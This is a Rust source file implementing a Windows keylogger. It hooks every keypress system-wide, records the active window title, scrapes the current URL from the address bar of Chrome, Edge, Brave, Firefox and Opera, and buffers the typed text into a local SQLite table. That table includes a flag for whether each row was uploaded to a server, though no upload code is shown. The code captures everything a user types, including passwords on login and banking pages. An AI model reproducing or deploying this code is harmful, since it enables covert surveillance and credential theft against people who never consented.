use rdev::{listen, Event, EventType, Key};
use rusqlite::{params, Connection};
use std::sync::{ Mutex};
use std::time::SystemTime;
use log::info;
use winapi::um::winuser::{GetForegroundWindow, GetWindowTextW};
use windows::Win32::UI::WindowsAndMessaging::{GetClassNameW, FindWindowExW};
use windows::Win32::Foundation::HWND;
use regex::Regex;

use windows::core::PCWSTR;

// Database constants
const DATABASE_PATH: &str = "winkey.db";

// Shared state for active window and line buffer
lazy_static::lazy_static! {
        static ref ACTIVE_WINDOW: Mutex<String> = Mutex::new(String::new());
        static ref LINE_BUFFER: Mutex<String> = Mutex::new(String::new());
    }

#[derive(Debug)]
enum BrowserType {
    Chrome,
    Edge,
    Firefox,
    Opera,
    Brave
}


/// Fetch the active window title
fn get_active_window_title_new() -> String {
    unsafe {
        let hwnd = windows::Win32::UI::WindowsAndMessaging::GetForegroundWindow();
        let mut text_buf = [0u16; 512];
        let len = windows::Win32::UI::WindowsAndMessaging::GetWindowTextW(hwnd, &mut text_buf);

        if len > 0 {
            String::from_utf16_lossy(&text_buf[..len as usize])
        } else {
            String::new()
        }
    }
}

fn get_active_window_title() -> String {
    let hwnd = unsafe { GetForegroundWindow() };
    if hwnd.is_null() {
        return "Unknown".to_string();
    }

    let mut buffer = [0u16; 512];
    let len = unsafe { GetWindowTextW(hwnd, buffer.as_mut_ptr(), buffer.len() as i32) };

    if len > 0 {
        String::from_utf16_lossy(&buffer[..len as usize])
    } else {
        "Unknown".to_string()
    }
}

/// Initialize SQLite database
fn init_db() -> Connection {
    let conn = Connection::open(DATABASE_PATH).expect("Failed to open SQLite database");
    conn.execute(
        "CREATE TABLE IF NOT EXISTS key_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                window_title TEXT,
                is_browser BOOLEAN,
                url TEXT,
                keys TEXT,
                datetime TEXT,
                is_uploaded_to_server BOOLEAN DEFAULT 0
            )",
        [],
    )
        .expect("Failed to create table in SQLite database");
    conn
}

/// Map `Key` to its string representation
fn map_key_to_string(key: &Key) -> String {
    match key {
        Key::Space => " ".to_string(),
        Key::Return => "\n".to_string(),
        Key::Backspace => "[BACKSPACE]".to_string(),
        Key::Tab => "\t".to_string(),
        _ => format!("{:?}", key).trim_start_matches("Key").to_string(),
    }
}

/// Check if the active window is a browser
fn is_browser_window(window_title: &str) -> bool {
    window_title.to_lowercase().contains("chrome")
        || window_title.to_lowercase().contains("firefox")
        || window_title.to_lowercase().contains("edge")
        || window_title.to_lowercase().contains("opera")
        || window_title.to_lowercase().contains("brave")
}

pub fn get_browser_url() -> String {
    let window_title = get_active_window_title_new();
    let browser_type = detect_browser_type(&window_title);

    match browser_type {
        Some(browser) => get_url_for_browser(browser),
        None => String::new()
    }
}

fn detect_browser_type(window_title: &str) -> Option<BrowserType> {
    let title_lower = window_title.to_lowercase();

    if title_lower.contains("chrome") {
        Some(BrowserType::Chrome)
    } else if title_lower.contains("microsoft edge") {
        Some(BrowserType::Edge)
    } else if title_lower.contains("firefox") {
        Some(BrowserType::Firefox)
    } else if title_lower.contains("opera") {
        Some(BrowserType::Opera)
    } else if title_lower.contains("brave") {
        Some(BrowserType::Brave)
    } else {
        None
    }
}

fn get_url_for_browser(browser_type: BrowserType) -> String {
    match browser_type {
        BrowserType::Chrome | BrowserType::Edge | BrowserType::Brave => {
            get_chromium_based_url(browser_type)
        },
        BrowserType::Firefox => get_firefox_url(),
        BrowserType::Opera => get_opera_url(),
    }
}

// First, add this function to convert &str to wide string
fn to_wide_string(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(std::iter::once(0)).collect()
}

// Then modify the get_chromium_based_url function where the error occurs:
fn get_chromium_based_url(browser_type: BrowserType) -> String {
    unsafe {
        // Find the main browser window
        let class_name = match browser_type {
            BrowserType::Chrome => "Chrome_WidgetWin_1",
            BrowserType::Edge => "Chrome_WidgetWin_1",
            BrowserType::Brave => "Chrome_WidgetWin_1",
            _ => return String::new(),
        };

        let class_name_wide = to_wide_string(class_name);
        let omnibox_class_wide = to_wide_string("Chrome_OmniboxView");

        // Find the address bar
        let mut hwnd = FindWindowExW(
            HWND(0),
            HWND(0),
            PCWSTR::from_raw(class_name_wide.as_ptr()),
            PCWSTR::null()
        );

        while hwnd.0 != 0 {
            let mut class_name_buf = [0u16; 256];
            let len = GetClassNameW(hwnd, &mut class_name_buf);
            let window_class = String::from_utf16_lossy(&class_name_buf[..len as usize]);

            // Find the Chrome address bar using converted wide string
            let address_hwnd = FindWindowExW(
                hwnd,
                HWND(0),
                PCWSTR::from_raw(omnibox_class_wide.as_ptr()),
                PCWSTR::null()
            );

            if address_hwnd.0 != 0 {
                let mut text_buf = [0u16; 2048];
                let len = windows::Win32::UI::WindowsAndMessaging::GetWindowTextW(address_hwnd, &mut text_buf);

                if len > 0 {
                    let url = String::from_utf16_lossy(&text_buf[..len as usize]);
                    // Clean up the URL
                    return clean_url(&url);
                }
            }

            hwnd = FindWindowExW(
                HWND(0),
                hwnd,
                PCWSTR::from_raw(class_name_wide.as_ptr()),
                PCWSTR::null()
            );
        }
    }
    String::new()
}

fn get_firefox_url() -> String {
    unsafe {
        // Convert Firefox class name to wide string
        let firefox_class_wide = to_wide_string("MozillaWindowClass");

        // Firefox main window class
        let hwnd = FindWindowExW(
            HWND(0),
            HWND(0),
            PCWSTR::from_raw(firefox_class_wide.as_ptr()),
            PCWSTR::null()
        );

        if hwnd.0 != 0 {
            // Get the title which contains the URL
            let mut text_buf = [0u16; 2048];
            let len = windows::Win32::UI::WindowsAndMessaging::GetWindowTextW(hwnd, &mut text_buf);

            if len > 0 {
                let title = String::from_utf16_lossy(&text_buf[..len as usize]);
                // Firefox puts the URL at the end of the title after a dash
                if let Some(url) = title.split(" - ").last() {
                    return clean_url(url);
                }
            }
        }
    }

    String::new()
}

fn get_opera_url() -> String {
    unsafe {
        // Convert class names to wide strings
        let chrome_class_wide = to_wide_string("Chrome_WidgetWin_1");
        let omnibox_class_wide = to_wide_string("Chrome_OmniboxView");

        // Opera uses similar class names to Chrome
        let hwnd = FindWindowExW(
            HWND(0),
            HWND(0),
            PCWSTR::from_raw(chrome_class_wide.as_ptr()),
            PCWSTR::null()
        );

        if hwnd.0 != 0 {
            let address_hwnd = FindWindowExW(
                hwnd,
                HWND(0),
                PCWSTR::from_raw(omnibox_class_wide.as_ptr()),
                PCWSTR::null()
            );

            if address_hwnd.0 != 0 {
                let mut text_buf = [0u16; 2048];
                let len = windows::Win32::UI::WindowsAndMessaging::GetWindowTextW(address_hwnd, &mut text_buf);

                if len > 0 {
                    let url = String::from_utf16_lossy(&text_buf[..len as usize]);
                    return clean_url(&url);
                }
            }
        }
    }

    String::new()
}

fn clean_url(url: &str) -> String {
    // Remove common prefixes and clean up
    let url = url.trim();
    let url = url.strip_prefix("Address and search bar").unwrap_or(url);
    let url = url.strip_prefix("Search or enter address").unwrap_or(url);
    let url = url.strip_prefix("Type a search term or web address").unwrap_or(url);

    // List of common protocols
    let protocols = [
        "http://", "https://", "ftp://", "sftp://",
        "file://", "mailto:", "news:", "telnet://",
        "gopher://", "ws://", "wss://", "irc://",
        "ssh://", "git://", "rtsp://", "ldap://"
    ];

    // First try to extract URL with any known protocol
    let protocol_pattern = format!(
        r"({})[^\s]+",
        protocols.join("|").replace("//", r"\/\/")
    );
    let re = Regex::new(&protocol_pattern).unwrap();

    if let Some(matched) = re.find(url) {
        let mut url = matched.as_str().to_string();
        // Remove trailing punctuation that might have been caught
        while url.ends_with(|c: char| !c.is_alphanumeric() && c != '/') {
            url.pop();
        }
        return url;
    }

    // If no protocol found, check if it's a domain
    let domain_re = Regex::new(r"^([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}(/[^\s]*)?").unwrap();
    if let Some(matched) = domain_re.find(url) {
        // Check if it might be a secure service (like banking, email, etc.)
        let domain = matched.as_str();
        let secure_keywords = ["bank", "login", "account", "secure", "mail"];
        if secure_keywords.iter().any(|&keyword| domain.contains(keyword)) {
            return format!("https://{}", domain);
        }
        // Default to http for other domains
        return format!("http://{}", domain);
    }

    // Handle special cases like localhost
    if url.starts_with("localhost") {
        return format!("http://{}", url);
    }

    // Handle IP addresses
    let ip_re = Regex::new(r"^(\d{1,3}\.){3}\d{1,3}(:\d+)?(/[^\s]*)?").unwrap();
    if let Some(matched) = ip_re.find(url) {
        return format!("http://{}", matched.as_str());
    }

    url.to_string()
}


/// Log key data into the SQLite database
fn log_to_db(window_title: &str, is_browser: bool, url: Option<String>, keys: &str) {
    let conn = init_db();
    let datetime = SystemTime::now()
        .duration_since(SystemTime::UNIX_EPOCH)
        .expect("System time before UNIX epoch")
        .as_secs()
        .to_string();
    conn.execute(
        "INSERT INTO key_logs (window_title, is_browser, url, keys, datetime) VALUES (?1, ?2, ?3, ?4, ?5)",
        params![window_title, is_browser, url.unwrap_or_default(), keys, datetime],
    )
        .expect("Failed to insert data into SQLite database");
}

/// Handle a key event
fn handle_event(event: Event) {
    match event.event_type {
        EventType::KeyPress(key) => {
            let key_str = map_key_to_string(&key);

            // Get current window title
            let current_window_title = get_active_window_title();

            // Check if window has changed
            let should_log_previous = {
                let active_window = ACTIVE_WINDOW.lock().unwrap();
                !active_window.is_empty() && *active_window != current_window_title
            };

            // If window changed and we have buffered text, log it first
            if should_log_previous {
                let previous_window = {
                    let active_window = ACTIVE_WINDOW.lock().unwrap();
                    active_window.clone()
                };

                let buffered_text = {
                    let mut buffer = LINE_BUFFER.lock().unwrap();
                    let text = buffer.clone();
                    buffer.clear();
                    text
                };

                // Only log if we actually have content
                if !buffered_text.is_empty() {
                    let is_browser = is_browser_window(&previous_window);
                    let url = if is_browser {
                        Some(get_browser_url())
                    } else {
                        None
                    };

                    log_to_db(&previous_window, is_browser, url, &buffered_text);
                }
            }

            // Update active window
            {
                let mut active_window = ACTIVE_WINDOW.lock().unwrap();
                *active_window = current_window_title.clone();
            }

            // Handle the current keystroke
            match key_str.as_str() {
                "\n" => {
                    let mut buffer = LINE_BUFFER.lock().unwrap();
                    let line = buffer.clone();
                    buffer.clear();

                    if !line.is_empty() {
                        let is_browser = is_browser_window(&current_window_title);
                        let url = if is_browser {
                            Some(get_browser_url())
                        } else {
                            None
                        };

                        log_to_db(&current_window_title, is_browser, url, &line);
                    }
                },
                // Consider also logging on sentence endings
                "." | "!" | "?" => {
                    let mut buffer = LINE_BUFFER.lock().unwrap();
                    buffer.push_str(&key_str);

                    // Optional: log on sentence endings if buffer is substantial
                    if buffer.len() > 20 {  // Configurable threshold
                        let line = buffer.clone();
                        buffer.clear();

                        let is_browser = is_browser_window(&current_window_title);
                        let url = if is_browser {
                            Some(get_browser_url())
                        } else {
                            None
                        };

                        log_to_db(&current_window_title, is_browser, url, &line);
                    }
                },
                _ => {
                    let mut buffer = LINE_BUFFER.lock().unwrap();
                    buffer.push_str(&key_str);
                }
            }
        }
        _ => {}
    }
}

/// Start keylogger
pub fn start_keylogging() {
    info!("Starting keylogger...");
    if let Err(error) = listen(move |event| handle_event(event)) {
        eprintln!("Error: {:?}", error);
    }
}